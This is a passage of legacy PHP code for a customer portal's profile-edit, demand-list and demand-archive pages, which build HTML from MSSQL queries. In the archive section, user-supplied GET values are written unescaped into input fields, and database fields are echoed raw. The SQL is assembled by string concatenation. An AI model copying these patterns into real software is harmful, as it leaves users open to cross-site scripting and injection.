    require_once ("./config/mssql_dbconnect.php");
        @$sql = "SELECT * FROM dbo.[120_registration] WHERE login_name = '".mssecuresql($_SESSION[$sess_id.'logged_user'])."' ";
        //program_log(@$sql,"yes",'sql.log');
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
$get_data = '<form id="edit_form" method="POST" >
<div style="font-size: 18px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 10px; top: 10px;color:gray;">
	'.dictionary("profile_edit",$_SESSION["language"]).'</div>
<div style="font-size: 12px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 295px; top: 16px;">
	<span style="color:blue;cursor:pointer;" onmouseout="this.style.color=\'blue\'" onmouseover="this.style.color=\'red\'" onclick="parent.customer_profile();" >'.dictionary("customer_profile",$_SESSION["language"]).'</span> / <span style="color:blue;cursor:pointer;" onmouseout="this.style.color=\'blue\'" onmouseover="this.style.color=\'red\'" onclick="parent.demand_archive();" >'.dictionary("demand_archive",$_SESSION["language"]).'</span></div>
<div style="font-size: 18px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 10px; top: 40px;text-decoration: underline;">
'.$row["full_name"].'</div>
<div style="position: absolute; left: 573px; top: 10px">
	<img alt="" src="./modules/userfiles/images/logo.png" style="height: 65px; width: 105px" /></div>
    

    
<div style="position: absolute; left: 10px; top: 80px">
<table style="border:0px;width:684px;" >
<tr><td colspan=2 style="text-align:left;" ><span style="color:black;font-weight:bold;font-size:12px;font-family: verdana;" >'.dictionary("customer_information",$_SESSION["language"]).':</span>
</td>

<td style="width:35px;text-align:right;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: verdana;" ><span style="width:300px" >'.dictionary("delivery_address_list",$_SESSION["language"]).'</span></td>

</tr>

<tr><td colspan=2 style="text-align:left;" ><input readonly=yes id=value1 name=value1 onclick="select()" style="border-left-width: 0px; cursor: pointer; font-size: 12px; height: 25px; font-family: arial,geneva,sans-serif; border-right-width: 0px; background: url(./images/search_field.png) no-repeat left top; border-bottom-width: 0px; color: white; text-align: center; padding-top: 5px; border-top-width: 0px; width: 169px" type="text" value="'.$row["login_name"].'" />
<input id=value2 onclick=this.select(); name=value2 style="border-left-width: 0px; cursor: pointer; font-size: 12px; height: 25px; font-family: arial,geneva,sans-serif; border-right-width: 0px; background: url(./images/search_field.png) no-repeat left top; border-bottom-width: 0px; color: white; text-align: center; padding-top: 5px; border-top-width: 0px; width: 169px" type="text" value="'.dictionary("unchanged",$_SESSION["language"]).'" onkeyup="passwordStrength(this.value,document.getElementById(\'strendth\'))" />
<div style="width: 348px;height:5px;font-size:3px;"><span style="width: 173px"> </span><span id="strendth" style=height:5px;font-size:3px;lenght:169px;cursor:pointer; ></span></div>
</td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >
'.dictionary("new",$_SESSION["language"]).' <input onclick=parent.new_delivery_address() id=reg_value23 name=reg_value23 type="checkbox" /><input disabled=disabled onclick=select() onchange=document.getElementById("deva_delete").disabled=true; maxlength="20" id=reg_value14 name=reg_value14 type=text default_value="'.dictionary("new",$_SESSION["language"]).'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:140px;padding-top:4px;text-align:right;height:22px;border:0;background:url(\'./images/input_140_22.png\') no repeat top left;" >
</td>

</tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("surname",$_SESSION["language"]).",".dictionary("name",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input id=reg_value1 name=reg_value1 type=text value="'.$row["full_name"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/yellow_219_22.png\') no repeat top left;" ></span></td>

<td style="width:35px;" ></td><td rowspan=3 colspan=2 style="text-align:right;vertical-align:top;color:black;font-weight:normal;font-size:12px;font-family: arial;width:300px;border:0;" ><div style="overflow-y:scroll;overflow-x:hidden;width:219px;align:right;vertical-align:top;color:black;font-weight:normal;font-size:12px;font-family: arial;padding-top:4px;height:80px;border:0;background:url(\'./images/yellow_219_80.png\') repeat left top;" >
';
//delivery list
@$sql1 = "SELECT * FROM [dbo].[120_delivery_address] WHERE registration_id = '".mssecuresql($row["id"])."'ORDER BY delivery_address_name ASC";
@$check1 = sqlsrv_query( $conn, $sql1 , $params, $options );
$cycle=1;
while( @$row1 = sqlsrv_fetch_array( @$check1, SQLSRV_FETCH_BOTH ) ) {
    $get_data.='<div onclick=parent.load_delivery_address("'.$row1["id"].'"); unselectable="on" id=dev_addr'.$cycle.' class="fast_window_out" onmouseout="className=\'fast_window_out\';" onmouseover="className=\'fast_window_in\';" >'.$row1["delivery_address_name"].'</div>';
    $cycle++;
}
$get_data.='</td>

</tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("ic",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input id=reg_value2 name=reg_value2 type=text value="'.$row["ico"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:140px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_140_22.png\') no repeat top left;" ><span style=vertical-align:top;cursor:pointer;margin-left:5px;width:74px;height:22px;margin-top:1px;padding-top:4px;font-weight:bold;font-size:12px;font-family:verdana;text-align:center;color:white;background:url(\'./images/ares.png\') no repeat top left; onmouseout="this.style.color=\'white\'" onmouseover="this.style.color=\'#F2DE41\'" onclick="parent.mfcr(document.getElementById(\'reg_value2\').value);" >ARES</span></span></td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("company",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input id=reg_value3 name=reg_value3 type=text value="'.$row["company"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/yellow_219_22.png\') no repeat top left;" ></span></td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("dic",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input id=reg_value7 name=reg_value7 type=text value="'.$row["dic"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span></td>
<td style="width:35px;" ></td>
<td colspan=2 style="width:300px;text-align:right;" >
<span><input disabled=disabled  onclick=select() id=reg_value15 name=reg_value15 type=text default_value="'.dictionary("surname",$_SESSION["language"]).",".dictionary("name",$_SESSION["language"]).':"  style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td>
</tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("street",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input id=reg_value4 name=reg_value4 type=text value="'.$row["street"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/yellow_219_22.png\') no repeat top left;" ></span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;" >
<span><input disabled=disabled onclick=select() id=reg_value16 name=reg_value16 type=text default_value="'.dictionary("company",$_SESSION["language"]).'"  style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("city",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input id=reg_value5 name=reg_value5 type=text value="'.$row["city"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/yellow_219_22.png\') no repeat top left;" ></span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;" >
<span><input disabled=disabled onclick=select() id=reg_value17 name=reg_value17 type=text default_value="'.dictionary("street",$_SESSION["language"]).'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td>
</tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("post_code",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input id=reg_value6 name=reg_value6 type=text value="'.$row["post_code"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/yellow_219_22.png\') no repeat top left;" ></span></td>
</td><td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;" >
<span><input disabled=disabled onclick=select() id=reg_value18 name=reg_value18 type=text default_value="'.dictionary("city",$_SESSION["language"]).'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td>
</tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("country",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><select id=reg_value10 name=reg_value10 style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/yellow_219_22.png\') no repeat top left;" >';
        @$sql1 = "SELECT country FROM [dbo].[120_country] ORDER BY country";
        @$check1 = sqlsrv_query( $conn, $sql1 , $params, $options );
        while( @$row1 = sqlsrv_fetch_array( @$check1, SQLSRV_FETCH_BOTH ) ) {
            $get_data.='<option value="'.@$row1[0].'" ';
            if ($row["country"]==@$row1[0] ) {$get_data.=' selected=selected ';} 
            $get_data.=' > '.@$row1[0].'</option>';    
        }
$get_data.='</select>
</span>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;" >
<span><input disabled=disabled onclick=select() id=reg_value19 name=reg_value19 type=text default_value="'.dictionary("post_code",$_SESSION["language"]).'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td>
</tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("phone",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input id=reg_value8 name=reg_value8 type=text value="'.$row["phone"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;" >
<span>

<select disabled=disabled id=reg_value20 name=reg_value20 default_value="" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" >';
        @$sql1 = "SELECT country FROM [dbo].[120_country] ORDER BY country";
        @$check1 = sqlsrv_query( $conn, $sql1 , $params, $options );
        while( @$row1 = sqlsrv_fetch_array( @$check1, SQLSRV_FETCH_BOTH ) ) {
            $get_data.='<option value="'.@$row1[0].'" > '.@$row1[0].'</option>';    
        }
$get_data.='</select>

</span>
</td>
</tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("email",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span id=email_check status=BAD style="width:32px;vertical-align:middle;"></span><span><input id=reg_value9 name=reg_value9 onkeyup="parent.check_email(\'validity\');" type=text value="'.$row["email"].'" style="padding-left:5px;padding-right:5px;color:white;font-weight:normal;font-size:12px;font-family: arial;width:187px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_email.png\') no repeat top left;" ></span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;" >
<span><input disabled=disabled onclick=select() id=reg_value21 name=reg_value21 type=text default_value="'.dictionary("phone",$_SESSION["language"]).'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td>
</tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("shipping",$_SESSION["language"]).': </span>
</td><td style="align:left;height:22px;" ><span>
<select name=reg_value11 id=reg_value11 style="border:0px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;background:url(\'./images/input_219_22.png\') no repeat top left;" >';
        @$sql1 = "SELECT * FROM [dbo].[100_shipping_type] ORDER BY sequence";
        @$check1 = sqlsrv_query( $conn, $sql1 , $params, $options );
        while( @$row1 = sqlsrv_fetch_array( @$check1, SQLSRV_FETCH_BOTH ) ) {
            $get_data.='<option value="'.@$row1["data_type"].'" ';
            if ($row["shipping"]==@$row1["data_type"] ) {$get_data.=' selected=selected ';} 
            $get_data.=' > '.dictionary(@$row1["data_type"],$_SESSION["language"]).'</option>';    
        }
$get_data.='</select>
</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;" >
<span><input disabled=disabled onclick=select() id=reg_value22 name=reg_value22 type=text default_value="'.dictionary("email",$_SESSION["language"]).'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td>
</tr>


<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("payment_terms",$_SESSION["language"]).': </span></td><td style="align:left;" ><span>
<select name=reg_value12 id=reg_value12 style="color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" >';
        @$sql1 = "SELECT * FROM [dbo].[100_payment_terms] ORDER BY sequence";
        @$check1 = sqlsrv_query( $conn, $sql1 , $params, $options );
        while( @$row1 = sqlsrv_fetch_array( @$check1, SQLSRV_FETCH_BOTH ) ) {
            $get_data.='<option value="'.@$row1["data_type"].'" ';
            if ($row["payment_terms"]==@$row1["data_type"] ) {$get_data.=' selected=selected ';} 
            $get_data.=' > '.dictionary(@$row1["data_type"],$_SESSION["language"]).'</option>';    
        }
$get_data.='</select></span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;" >
<span id=deva_delete disabled=disabled onclick=parent.delete_delivery_address(); style="cursor:pointer;color:white;font-weight:bold;font-size:12px;font-family: verdana;text-align:center;width:79px;height:21px;background: url(./images/no.png);padding-top:3px;" onmouseout="this.style.color=\'white\'" onmouseover="this.style.color=\'#F2DE41\'" >'.dictionary("delete",$_SESSION["language"]).'</span><span style=width:60px; > </span><span onclick=parent.save_delivery_address(); style="cursor:pointer;color:white;font-weight:bold;font-size:12px;font-family: verdana;text-align:center;width:79px;height:21px;background: url(./images/yes.png);padding-top:3px;"  onmouseout="this.style.color=\'white\'" onmouseover="this.style.color=\'#F2DE41\'" >'.dictionary("save",$_SESSION["language"]).'</span>
</td>
</tr>

<tr><td colspan=2 style="width:120px;" >
<span onclick=parent.edit_registration_request(); style="cursor:pointer;color:white;font-weight:bold;font-size:12px;font-family: verdana;text-align:center;width:187px;height:22px;background: url(./images/registration_confirm.png);padding-top:3px;"  onmouseout="this.style.color=\'white\'" onmouseover="this.style.color=\'#F2DE41\'" >'.dictionary("change_registration",$_SESSION["language"]).'</span>
</td></tr>


</table>
</div>
<input type=hidden name=check value="EDIT" >
</form>

<div onclick=hidden_window_status(this.id); id=window_status style="display:none;cursor:pointer;position: absolute; left: 125px; top: 445px; width:450px;height:60px;border:0px;text-align:center;padding:10;14;10;10px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/atypical.png) top left no-repeat;" >
<strong>'.dictionary("bad_request",$_SESSION["language"]).'</strong></div>
<script>function delayed_hidden_window_status(value){setTimeout(function(){document.getElementById(value).style.display="none";}, 5000);}function hidden_window_status(value){document.getElementById(value).style.display="none";}</script>
';    
echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="stylesheet" href="./modules/ckeditor/shadowbox/shadowbox.css" type="text/css" media="screen" /><script src="./modules/ckeditor/shadowbox/shadowbox.js" type="text/javascript"></script><script>Shadowbox.init();var fn_items = new Array();if (document.all){document.onkeydown = function (){if (27==event.keyCode){parent.close_tab();}}}</script>
<style>
.strength{width:0px;background:gray;}
.strength0{width:28px;background:gray;}
.strength1{width:56px;background:#ff0000;}
.strength2{width:84px;background:#ff5f5f;}
.strength3{width:112px;background:#56e500;}
.strength4{width:140px;background:#4dcd00;}
.strength5{width:169px;background:#399800;}
</style>

<script>
function passwordStrength(password,passwordStrength)
{
 var desc = new Array();
 desc[0] = "'.dictionary("very_weak",$_SESSION["language"]).'";
 desc[1] = "'.dictionary("weak",$_SESSION["language"]).'";
 desc[2] = "'.dictionary("good",$_SESSION["language"]).'";
 desc[3] = "'.dictionary("medium",$_SESSION["language"]).'";
 desc[4] = "'.dictionary("strong",$_SESSION["language"]).'";
 desc[5] = "'.dictionary("strongest",$_SESSION["language"]).'";
 var score   = 0;
 if (password.length > 6) score++;
 if ( ( password.match(/[a-z]/) ) && ( password.match(/[A-Z]/) ) ) score++;
 if (password.match(/\d+/)) score++;
 if ( password.match(/.[!,@,#,$,%,^,&,*,?,_,~,-,(,)]/) ) score++;
 if (password.length > 12) score++;
if (password.length > 0){  
    passwordStrength.title = desc[score];
    passwordStrength.className = "strength" + score;
} else {
    passwordStrength.title = "";
    passwordStrength.className = "strength";
    }
}

</script>
 <style>
  .fast_window_out{
  opacity: 0.3;
  filter: alpha(opacity=30);
  cursor:pointer;
  margin: 0px;
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:none;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
  
 .fast_window_in{
  opacity: 1;
  filter: alpha(opacity=100);
  cursor:pointer;
  margin: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:#76C1FB;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}

 </style>
</head><body onload=delayed_hidden_message("reg_message"); style="width:100%;height:100%;padding:0px;margin:8px;margin-bottom:0px;background-image:url(\'./images/body.png\');background-repeat:no-repeat;background-attachment:fixed;background-position:center;">'.$get_data.'</body><script src="./functions/js/data_list.js" type="text/javascript"></script><script>parent.check_email("validity");</script></html>

';
}





if (isset($_GET["demand_list"]) && isset($_SESSION['lnamed'])){
    require_once ("./config/mssql_dbconnect.php");
    @$sql = "SELECT [id],[demand_id],[customer_name],[company] FROM [dbo].[120_demand_header] ORDER BY id";
    $get_data = "<html><head><meta http-equiv='Content-Type' content='text/html; charset=utf-8'><link rel='stylesheet' type='text/css' href='./css/catalog.css' /></head>
    <body id='body'><div  style='overflow-y:scroll;width:100%;height:100%;' >
    <table id=data_table border=2 frame=border rules=all  ><tr style=background-color:#98D1FF >
    <td>".dictionary("demand",$_SESSION["language"])."</td>
    <td>".dictionary("customer_identification",$_SESSION["language"])."</td>
    <td>".dictionary("company",$_SESSION["language"])."</td>
    <td>".dictionary("pdf_file",$_SESSION["language"])."</td>
    <td>".dictionary("html_file",$_SESSION["language"])."</td>
    <td>".dictionary("xml_file",$_SESSION["language"])."</td>
    </tr>"; 
    //program_log(@$sql,"yes",'sql.log');
    @$check = sqlsrv_query( $conn, $sql , $params, $options );
    while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
       $get_data .= "<tr>
    <td>".$row[1]."</td>
    <td>".$row[2]."</td>
    <td>".$row[3]."</td>
    <td style=text-align:center; ><img src=./images/pdf_off.png style=height:25px;cursor:pointer; onclick=window.open('./outputs/demand_template_pdf.php?id=".base64_encode($row[1])."'); ></td>
    <td style=text-align:center; ><img src=./images/html_off.png style=height:25px;cursor:pointer; onclick=window.open('./outputs/demand_template_html.php?id=".base64_encode($row[1])."'); ></td>
    <td style=text-align:center; ><img src=./images/xml_off.png style=height:25px;cursor:pointer; onclick=window.open('./outputs/demand_template_xml.php?id=".base64_encode($row[1])."'); ></td>
    </tr>"; 
    }
    echo $get_data."</div></body></html><script>parent.document.getElementById('loading').style.display='none';</script>";
}




if (isset($_GET["demand_archive"]) && @$_SESSION[$sess_id.'logged_user'] ){
    require_once ("./config/mssql_dbconnect.php");
        @$sql = "SELECT * FROM dbo.[120_registration] WHERE login_name = '".mssecuresql($_SESSION[$sess_id.'logged_user'])."' ";
        //program_log(@$sql,"yes",'sql.log');
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
$get_data = '<div style="font-size: 18px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 10px; top: 10px;color:gray;">
	'.dictionary("demand_archive",$_SESSION["language"]).'</div>
<div style="font-size: 12px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 295px; top: 16px;">
	<span style="color:blue;cursor:pointer;" onmouseout="this.style.color=\'blue\'" onmouseover="this.style.color=\'red\'" onclick="parent.profile_edit();" >'.dictionary("profile_edit",$_SESSION["language"]).'</span> / <span style="color:blue;cursor:pointer;" onmouseout="this.style.color=\'blue\'" onmouseover="this.style.color=\'red\'" onclick="parent.customer_profile();" >'.dictionary("customer_profile",$_SESSION["language"]).'</span></div>
<div style="font-size: 18px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 10px; top: 40px;text-decoration: underline;">
'.$row["full_name"].'</div>
<div style="position: absolute; left: 573px; top: 10px">
	<img alt="" src="./modules/userfiles/images/logo.png" style="height: 65px; width: 105px" /></div>
<div style="position: absolute; left: 10px; top: 80px">
<table style="border:0px;width:349px;" >
<tr><td colspan=2 style="text-align:left;" ><span style="color:black;font-weight:bold;font-size:12px;font-family: verdana;" >'.dictionary("customer_information",$_SESSION["language"]).':</span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("surname",$_SESSION["language"]).",".dictionary("name",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:140px;" >'.$row["full_name"].'</span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("company",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:140px;" >'.$row["company"].'</span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("ic",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:140px;" >'.$row["ico"].'</span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("dic",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:140px;" >'.$row["dic"].'</span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("street",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:140px;" >'.$row["street"].'</span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("post_code",$_SESSION["language"])." / ".dictionary("city",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:140px;" >'.$row["post_code"]." ; ".$row["city"].'</span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("country",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:140px;" >'.$row["country"].'</span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("phone",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:140px;" >'.$row["phone"].'</span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("email",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:140px;" >'.$row["email"].'</span>
</td></tr>
</table>
</div>

<div style="position: absolute; left: 280px; top: 275px; width:400px;height:250px;border:0px;text-align:center;padding:0;14;0;10px;font-weight:normal;font-size:12px;font-family: arial;" >
<span style="height:30px;" ><input onclick="select();" id=value1 name=value1 type=text style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:114px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_115_22.png\') no repeat top left;text-align:center;" value="';


if (@$_GET["v1"]<>'undefined' && @$_GET["v1"]<>"" && @$_GET["v1"]<>dictionary("by_demand_no",$_SESSION["language"]) ){$get_data .= @$_GET["v1"];}
else {@$_GET["v1"]="";$get_data .= dictionary("by_demand_no",$_SESSION["language"]);}


$get_data .='"  ></span><span style="width:12px;height:30px;"> </span><span style="height:30px;"><input onclick="select();" id=value2 name=value2 type=text style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:114px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_115_22.png\') no repeat top left;text-align:center;" value="';


if ( @$_GET["v2"]<>'undefined' && @$_GET["v2"]<>"" && @$_GET["v2"]<>dictionary("by_catalog_no",$_SESSION["language"]) ){$get_data .= @$_GET["v2"];}
else {@$_GET["v2"]="";$get_data .= dictionary("by_catalog_no",$_SESSION["language"]);}

$get_data .='" ></span><span style="width:12px;height:30px;"> </span><span style="height:30px;"><input onclick="select();" id=value3 name=value3 type=text style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:114px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_115_22.png\') no repeat top left;text-align:center;" value="';


if (@$_GET["v3"]<>'undefined' && @$_GET["v3"]<>"" && @$_GET["v3"]<>dictionary("by date",$_SESSION["language"]) ){$get_data .= @$_GET["v3"];}
else {@$_GET["v3"]="";$get_data .= dictionary("by date",$_SESSION["language"]);}

$get_data .='" ></span><span style="width:12px;height:30px;"> </span><span id=search_button name=search_button style="cursor:pointer;width:22px;height:22px;border:0;background:\'url(./images/search_off.png)\';position: relative; top: -5px;" onmouseover="this.style.backgroundImage=\'url(./images/search_on.png)\';" onmouseout="this.style.backgroundImage=\'url(./images/search_off.png)\';" onclick="parent.demand_archive(document.getElementById(\'value1\').value,document.getElementById(\'value2\').value,document.getElementById(\'value3\').value);" > </span>


<div onselectstart="return false;" style="width:400px;height:220px;border:0px;text-align:left;padding:10;14;10;10px;font-weight:bold;font-size:16px;font-family: verdana;background: url(./images/yellow_400_220.png) top left ;overflow-y: scroll;" >
'.dictionary("demands_history",$_SESSION["language"]);

@$sql = "SELECT header.demand_id, CAST(header.creation_date as DATE) as 'create date' FROM [dbo].[120_demand_header] header, [dbo].[120_demand_item] item WHERE (SELECT [login_name] FROM [120_registration] registration WHERE registration.id=header.[registration_id]) = '".mssecuresql(@$_SESSION[$sess_id.'logged_user'])."' AND item.demand_id = header.demand_id AND item.record like '%".mssecuresql(datedb(@$_GET["v2"]))."%' AND ( LEN ('".mssecuresql(@$_GET["v1"])."') = 0 OR ( LEN ('".mssecuresql(@$_GET["v1"])."') > 0 AND header.demand_id='".mssecuresql(@$_GET["v1"])."') ) AND ( LEN ('".mssecuresql(datedb(@$_GET["v3"]))."') = 0 OR ( LEN ('".mssecuresql(datedb(@$_GET["v3"]))."') > 0 AND CAST(header.creation_date AS DATE) = '".mssecuresql(datedb(@$_GET["v3"]))."') ) GROUP BY header.demand_id,header.creation_date ";        
//program_log(@$sql,"DELETE",'sql.log');
@$check = sqlsrv_query( $conn, $sql , $params, $options );
$temp_cycle=1;
while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
